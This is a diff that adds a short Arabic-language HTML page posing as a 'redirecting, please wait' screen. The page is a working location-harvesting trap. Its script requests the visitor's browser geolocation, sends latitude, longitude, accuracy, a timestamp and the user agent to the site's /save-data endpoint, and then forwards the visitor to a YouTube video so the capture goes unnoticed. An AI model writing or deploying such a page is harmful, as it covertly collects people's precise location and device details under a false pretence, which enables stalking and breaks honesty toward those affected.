@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <title>جارٍ التحويل...</title>
+</head>
+<body>
+  <h3>انتظر لحظة...</h3>
+  <script>
+    const ua = navigator.userAgent;
+
+    function sendAndRedirect(lat, lon, accuracy) {
+      fetch('/save-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          lat, lon, accuracy,
+          ts: Date.now(),
+          ua
+        })
+      }).finally(() => {
+        window.location.href = "https://www.youtube.com/watch?v=idrzp5p0c1I";
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        sendAndRedirect(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+      }, err => {
+        sendAndRedirect(null, null, null);
+      });
+    } else {
+      sendAndRedirect(null, null, null);
+    }
+  </script>
+</body>
+</html>
